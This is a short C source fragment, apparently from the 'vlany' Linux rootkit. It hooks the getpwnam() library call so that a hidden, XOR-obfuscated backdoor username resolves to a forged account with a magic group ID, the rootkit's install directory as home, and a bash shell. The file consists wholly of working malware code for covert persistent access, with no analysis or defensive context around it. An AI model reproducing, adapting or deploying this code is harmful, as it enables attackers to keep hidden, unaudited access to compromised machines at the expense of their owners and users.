struct passwd *getpwnam(const char *name)
{
    #ifdef PAM_DEBUG
        printf("[vlany] getpwnam() called\n");
    #endif

    HOOK(old_getpwnam, CGETPWNAM);
    
    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    if(!strcmp(name, vlany_user))
    {
        struct passwd *vlanypw;
        char *vlany_perm = strdup(VLANY_PERM); xor(vlany_perm);

        vlanypw = old_getpwnam(vlany_perm);
        vlanypw->pw_name = strdup(vlany_user);
        vlanypw->pw_uid = MAGIC_GID;
        vlanypw->pw_gid = MAGIC_GID;

        char home[64];
        char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
        snprintf(home, sizeof(home), "%s", install_dir);
        CLEAN(install_dir);

        vlanypw->pw_dir = strdup(home);
        vlanypw->pw_shell = "/bin/bash";

        CLEAN(vlany_user);
        CLEAN(vlany_perm);

        return vlanypw;
    }
    CLEAN(vlany_user);

    return old_getpwnam(name);
}
